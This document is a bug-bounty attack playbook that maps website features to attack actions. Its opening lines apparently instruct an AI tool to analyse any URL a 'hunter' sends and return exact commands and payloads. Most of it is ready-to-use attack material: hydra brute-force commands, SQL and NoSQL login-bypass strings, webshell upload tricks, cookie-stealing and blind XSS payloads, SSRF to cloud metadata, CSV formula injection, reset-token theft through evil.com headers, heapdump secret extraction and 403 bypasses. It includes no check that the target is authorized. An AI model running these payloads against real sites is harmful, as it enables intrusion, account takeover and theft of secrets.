# Website Feature Detection & Action Mapping

## HOW TO USE THIS GUIDE
When a hunter sends any website URL, analyze it completely:
1. Detect ALL features present
2. Map attack actions for each feature
3. Prioritize by impact
4. Give exact commands and payloads

---

## FEATURE DETECTION CHECKLIST

When analyzing any URL or website, check for these features:

### AUTHENTICATION FEATURES
```
[ ] Login page (username/password)
[ ] Registration/signup
[ ] Password reset / forgot password
[ ] Remember me functionality
[ ] OAuth / Social login (Google, Facebook, GitHub)
[ ] SSO / SAML
[ ] 2FA / MFA (SMS, Email, TOTP)
[ ] Magic link login
[ ] API key authentication
[ ] JWT tokens
[ ] Session cookies
```

### USER MANAGEMENT FEATURES
```
[ ] User profile / account settings
[ ] Change email
[ ] Change password
[ ] Delete account
[ ] Profile picture upload
[ ] Custom fields / bio
[ ] User roles (admin, user, moderator)
[ ] User list / directory
[ ] Invite users
[ ] Team / organization management
```

### FILE & UPLOAD FEATURES
```
[ ] Image upload
[ ] Document upload (PDF, DOCX, XLSX)
[ ] Avatar / profile picture
[ ] Import from file (CSV, XML, JSON)
[ ] Export to file
[ ] File manager / browser
[ ] Attachment in messages
[ ] Drag and drop upload
[ ] URL-based import ("import from URL")
[ ] Resume/CV upload
```

### SEARCH & QUERY FEATURES
```
[ ] Search box (text search)
[ ] Advanced search / filters
[ ] Autocomplete / typeahead
[ ] Sort by / order by
[ ] Category / tag filtering
[ ] Date range filtering
[ ] Full-text search
[ ] Search with URL parameters
[ ] Saved searches
```

### API & DATA FEATURES
```
[ ] REST API endpoints
[ ] GraphQL endpoint (/graphql)
[ ] Public API documentation
[ ] API keys management
[ ] Webhooks configuration
[ ] Data export (CSV, JSON, XML)
[ ] Data import
[ ] Batch operations
[ ] Pagination (page=, offset=, cursor=)
[ ] Sorting (sort=, order=)
```

### PAYMENT & FINANCIAL FEATURES
```
[ ] Subscription plans (free/paid)
[ ] Payment forms
[ ] Coupon / discount codes
[ ] Credit system / balance
[ ] Refund functionality
[ ] Invoice generation
[ ] Transaction history
[ ] Billing settings
[ ] Price calculation
[ ] Shopping cart
```

### COMMUNICATION FEATURES
```
[ ] Contact form
[ ] Email notifications
[ ] In-app messaging / chat
[ ] Comments / reviews
[ ] Notifications system
[ ] Newsletter subscription
[ ] Support tickets
[ ] Feedback forms
[ ] Push notifications
[ ] Webhooks
```

### INTEGRATION FEATURES
```
[ ] Third-party integrations
[ ] Connect to external services
[ ] OAuth app creation
[ ] Zapier / automation integrations
[ ] Embed code / widgets
[ ] API marketplace
[ ] Plugin system
[ ] SAML/SSO configuration
[ ] Slack / Teams integration
[ ] Calendar integration
```

### CONTENT FEATURES
```
[ ] Blog / CMS
[ ] Rich text editor (WYSIWYG)
[ ] Markdown editor
[ ] Template system
[ ] Dynamic content loading
[ ] Content sharing
[ ] Public/private content
[ ] Content scheduling
[ ] Version history
[ ] Collaboration / co-editing
```

### ADMIN FEATURES
```
[ ] Admin panel / dashboard
[ ] User management (admin)
[ ] System settings
[ ] Audit logs / activity logs
[ ] Reports / analytics
[ ] Configuration management
[ ] Role/permission management
[ ] Bulk operations
[ ] System health / monitoring
[ ] Backup / restore
```

---

## FEATURE → ATTACK ACTION MAPPING

### 🔴 LOGIN PAGE
```
ACTIONS:
├── Brute Force
│   └── hydra -l admin -P rockyou.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:Invalid"
├── SQL Injection in login
│   └── username: admin'--
│   └── username: ' OR 1=1--
│   └── username: admin' OR '1'='1
├── NoSQL Injection (MongoDB)
│   └── {"username":{"$gt":""},"password":{"$gt":""}}
├── Username Enumeration
│   └── Different error for valid vs invalid username
├── Account Lockout Testing
│   └── Send 10+ wrong passwords → locked? timing?
├── Default Credentials
│   └── admin:admin, admin:password, admin:123456
└── JWT/Session Analysis
    └── Check token in response → decode → test alg:none
```

### 🔴 PASSWORD RESET
```
ACTIONS:
├── Host Header Injection → steal reset token
│   └── Add header: X-Forwarded-Host: evil.com
│   └── Reset link goes to evil.com
├── Token Analysis
│   └── Is token predictable? Sequential? Time-based?
│   └── Try old/expired tokens
│   └── Try short token brute force (4-6 chars)
├── Response Manipulation
│   └── {"valid": false} → {"valid": true}
├── Email Parameter Manipulation
│   └── email=victim@target.com → email=victim@target.com@attacker.com
│   └── email=victim@target.com%0a%0dcc:attacker@evil.com
├── Token in URL → Referer Leakage
│   └── Reset page loads 3rd party scripts → token in Referer
└── Race Condition on Token
    └── Use same token twice simultaneously
```

### 🔴 OAUTH / SOCIAL LOGIN
```
ACTIONS:
├── Open Redirect in redirect_uri
│   └── redirect_uri=https://target.com/open-redirect?url=https://evil.com
├── Missing State Parameter → CSRF
│   └── No state param = OAuth CSRF possible
├── Account Takeover via Email
│   └── Register with same email via OAuth
├── Scope Manipulation
│   └── Add: scope=email+profile+admin
├── Token Leakage in Referer
│   └── Token in URL → 3rd party scripts → Referer leak
└── Authorization Code Reuse
    └── Use same code twice
```

### 🔴 FILE UPLOAD
```
ACTIONS:
├── Webshell Upload (RCE)
│   └── Upload: shell.php, shell.php5, shell.phtml
│   └── Bypass: change Content-Type to image/jpeg
│   └── Bypass: shell.php.jpg, shell.php%00.jpg
├── SVG XSS
│   └── <svg><script>alert(document.cookie)</script></svg>
├── XXE via DOCX/PDF
│   └── Inject XXE in XML inside DOCX
├── SSRF via Image URL fetch
│   └── If "import from URL" exists: use internal IP
├── Path Traversal in filename
│   └── filename: ../../../../etc/passwd
│   └── filename: ../config.php
├── Stored XSS via filename
│   └── filename: <img src=x onerror=alert(1)>.jpg
└── ImageMagick (ImageTragick)
    └── Malicious image with shell payload
```

### 🔴 USER PROFILE / ACCOUNT SETTINGS
```
ACTIONS:
├── Stored XSS in every field
│   └── Name: <script>alert(1)</script>
│   └── Bio: <img src=x onerror=alert(1)>
│   └── Website: javascript:alert(1)
├── IDOR - Change other users' profile
│   └── POST /api/users/1234/update → change to 1235
├── SSTI in template fields
│   └── Name: {{7*7}} → if 49 appears = SSTI!
├── Mass Assignment
│   └── Add: "role":"admin","isAdmin":true
├── Email Change → Account Takeover
│   └── Change email without verification?
│   └── CSRF on email change?
└── Password Change without old password
    └── CSRF + no old password = ATO
```

### 🔴 SEARCH FUNCTIONALITY
```
ACTIONS:
├── Reflected XSS
│   └── q=<script>alert(1)</script>
│   └── q="><img src=x onerror=alert(1)>
├── SQL Injection
│   └── q=' OR 1=1--
│   └── q=test' AND SLEEP(5)--
├── SSRF (if search fetches URLs)
│   └── q=http://169.254.169.254/
├── Server-Side Template Injection
│   └── q={{7*7}} → if 49 = SSTI
├── ReDoS (Regex Denial of Service)
│   └── q=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!
├── Information Disclosure
│   └── q=* or q=% → returns all records?
└── IDOR via search
    └── search other users' private data
```

### 🔴 API ENDPOINTS
```
ACTIONS:
├── BOLA/IDOR
│   └── Change IDs in every request
│   └── /api/users/1234 → /api/users/1235
├── Lack of Authentication
│   └── Remove Authorization header
│   └── Test all endpoints without token
├── Mass Assignment
│   └── Add extra fields to JSON body
├── HTTP Method Tampering
│   └── GET → POST → PUT → DELETE → PATCH
├── API Versioning
│   └── /api/v2/ → /api/v1/ (older = less secure)
├── Parameter Pollution
│   └── id=1&id=2&id=1,2
├── Injection Points
│   └── SQLi, XSS, SSRF in all parameters
└── GraphQL specific (if GraphQL)
    └── Introspection: {__schema{types{name}}}
```

### 🔴 PAYMENT / SUBSCRIPTION
```
ACTIONS:
├── Price Manipulation
│   └── Change price in request: "price": 0.01
│   └── Negative price: "price": -100
│   └── Negative quantity: "quantity": -1
├── Coupon Abuse (Race Condition)
│   └── Apply same coupon 20x simultaneously
│   └── Turbo Intruder in Burp
├── Currency Confusion
│   └── $1 USD vs $1 in another currency
├── Plan Manipulation
│   └── "plan": "free" → "plan": "enterprise"
├── Workflow Skip
│   └── Skip payment step → go to confirmation
├── Integer Overflow
│   └── quantity: 9999999999
└── Refund Abuse
    └── Refund more than paid
```

### 🔴 WEBHOOKS / INTEGRATIONS
```
ACTIONS:
├── SSRF via Webhook URL
│   └── Webhook URL: http://169.254.169.254/
│   └── Webhook URL: http://internal-service/
├── XSS via Webhook response
│   └── Webhook returns data displayed to user
├── CSRF on Webhook creation
│   └── Create webhook without CSRF token
├── Webhook Secret Bypass
│   └── Test without secret header
│   └── Replay old webhook requests
└── OAuth SSRF
    └── Callback URL: http://internal/api/
```

### 🔴 ADMIN PANEL
```
ACTIONS:
├── Direct Access (no auth check)
│   └── /admin without being admin
│   └── /admin/users, /admin/settings
├── IDOR → Vertical Privilege Escalation
│   └── Regular user accessing admin APIs
├── Mass Assignment to become admin
│   └── "role": "admin" in registration
├── Stored XSS → Admin Account Takeover
│   └── XSS in user-controlled data shown to admin
├── SQL Injection in admin search
│   └── Admin search has less input sanitization
└── Bulk Operation Abuse
    └── Bulk delete other users' data
```

### 🔴 COMMENTS / REVIEWS
```
ACTIONS:
├── Stored XSS (HIGH IMPACT)
│   └── <script>alert(document.cookie)</script>
│   └── Shown to all users → mass impact
├── Stored XSS → Admin Panel XSS
│   └── Blind XSS payloads
│   └── <script src="https://xsshunter.com/YOURPAYLOAD"></script>
├── HTML Injection
│   └── <h1>Fake Content</h1>
├── SSTI
│   └── {{7*7}}, ${7*7}
└── IDOR on delete/edit
    └── Delete other users' comments
```

### 🔴 CONTACT FORM / SUPPORT TICKETS
```
ACTIONS:
├── Blind XSS (fires in admin panel)
│   └── <script src="https://xsshunter.com/YOURPAYLOAD"></script>
├── Email Header Injection
│   └── name=test%0a%0dBcc:attacker@evil.com
├── SSRF via URL in form
│   └── Include URL field → test SSRF
├── IDOR on ticket access
│   └── /tickets/1234 → /tickets/1235
└── Information Disclosure
    └── Other users' ticket data in response
```

### 🔴 EXPORT FEATURES (PDF/CSV/XML)
```
ACTIONS:
├── SSRF via HTML injection in PDF
│   └── <iframe src="http://169.254.169.254/">
│   └── <img src="http://internal-service/">
├── XSS to PDF (SSRF/Local file read)
│   └── <script>document.write(document.cookie)</script>
├── CSV Injection (Formula Injection)
│   └── =cmd|' /C calc'!A0
│   └── @SUM(1+1)*cmd|' /C calc'!A0
│   └── +cmd|' /C calc'!A0
├── XXE in XML export
│   └── Inject XXE in XML template
└── IDOR in export
    └── Export other users' data
```

### 🔴 NOTIFICATIONS / EMAIL FEATURES
```
ACTIONS:
├── HTML Injection in emails
│   └── Injected HTML appears in notification emails
├── Open Redirect in email links
│   └── Unsubscribe links, action buttons
├── Email Spoofing (missing DMARC)
│   └── dig TXT _dmarc.target.com
│   └── No DMARC = spoofing possible
└── IDOR in notification preferences
    └── Change other users' notification settings
```

---

## QUICK ANALYSIS TEMPLATE

When given a URL, output this analysis:

```
TARGET: [URL]

DETECTED FEATURES:
🔴 Critical Attack Surface:
  - [Feature 1] → [Top attack]
  - [Feature 2] → [Top attack]

🟠 High Attack Surface:
  - [Feature 3] → [Attack]

🟡 Medium Attack Surface:
  - [Feature 4] → [Attack]

IMMEDIATE ACTIONS:
1. [First thing to test] → [Exact payload/command]
2. [Second thing] → [Exact payload/command]
3. [Third thing] → [Exact payload/command]

RECON COMMANDS:
[Specific recon for this target]

TOOLS TO USE:
[Specific tools for detected features]
```

---

## TECH STACK → SPECIFIC ATTACKS

### WordPress
```
Features to check:
- /wp-login.php → brute force, xmlrpc.php
- /wp-json/wp/v2/users → user enumeration
- /xmlrpc.php → brute force via XML-RPC
- Plugins → search CVEs for installed plugins

Commands:
wpscan --url https://target.com --enumerate u,p,t,cb,dbe
wpscan --url https://target.com -P rockyou.txt -U admin
curl https://target.com/wp-json/wp/v2/users
```

### Laravel / PHP Framework
```
Features:
- /_debugbar/ → debug info exposed
- .env file → credentials
- /telescope → Laravel Telescope
- /horizon → Laravel Horizon (queue manager)
- Routes: php artisan route:list equivalent in response

Actions:
curl https://target.com/.env
curl https://target.com/_debugbar/
nuclei -u https://target.com -t technologies/laravel/
```

### Spring Boot / Java
```
Features:
- /actuator → Spring Actuator (CRITICAL)
- /actuator/env → environment variables
- /actuator/heapdump → memory dump
- /actuator/mappings → all routes
- /h2-console → H2 database console
- /swagger-ui.html → API docs

Actions:
curl https://target.com/actuator/env
curl https://target.com/actuator/heapdump -o heap.bin
strings heap.bin | grep -iE "(password|secret|api_key)"
curl https://target.com/h2-console
```

### Node.js / Express
```
Features:
- /package.json → dependencies exposed
- /__proto__ → prototype pollution
- GraphQL often used

Actions:
curl https://target.com/package.json
Test: ?__proto__[polluted]=true
Check JS files for secrets
```

### Django / Python
```
Features:
- /admin → Django admin (default)
- /api/ → DRF (Django REST Framework)
- Debug mode: detailed error pages

Actions:
curl https://target.com/admin/
# Trigger error: https://target.com/page/that/doesnt/exist
# If debug=True: full stack trace with settings
```

### Ruby on Rails
```
Features:
- /rails/info → Rails info (dev)
- Mass assignment (old versions)
- CSRF tokens in forms

Actions:
curl https://target.com/rails/info/properties
# Test mass assignment with extra params
```

---

## RESPONSE CODE ANALYSIS

```
200 OK         → Endpoint exists, analyze response
301/302        → Redirect, follow and test destination
401            → Auth required, test bypass techniques
403            → Forbidden, test bypass:
               → X-Original-URL: /admin
               → X-Rewrite-URL: /admin
               → /admin/ → /ADMIN/ → /admin;/
               → /admin%2f → /./ path tricks
404            → Not found, check for info in response
405            → Method not allowed, try other methods
500            → Server error, analyze error message
               → Potential injection point
```

### 403 Bypass Techniques
```bash
# Headers
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "X-Forward-For: 127.0.0.1" https://target.com/admin

# Path manipulation
/admin/../admin
/ADMIN
/admin/
/admin;/
/admin/.
/./admin
/%2fadmin
/admin%20
/admin%09
/admin..;/
```

---

## SECURITY HEADERS ANALYSIS

```bash
# Check all security headers
curl -I https://target.com | grep -iE "(strict|content-security|x-frame|x-xss|x-content|referrer|permissions)"

# Missing headers = findings:
Missing: Strict-Transport-Security     → HTTPS not enforced
Missing: Content-Security-Policy       → XSS easier
Missing: X-Frame-Options               → Clickjacking possible
Missing: X-Content-Type-Options        → MIME sniffing
Missing: Referrer-Policy               → Data leakage
Missing: Permissions-Policy            → Feature abuse

# Test clickjacking
<iframe src="https://target.com" width="800" height="600"></iframe>
# If loads = clickjacking vulnerable
```
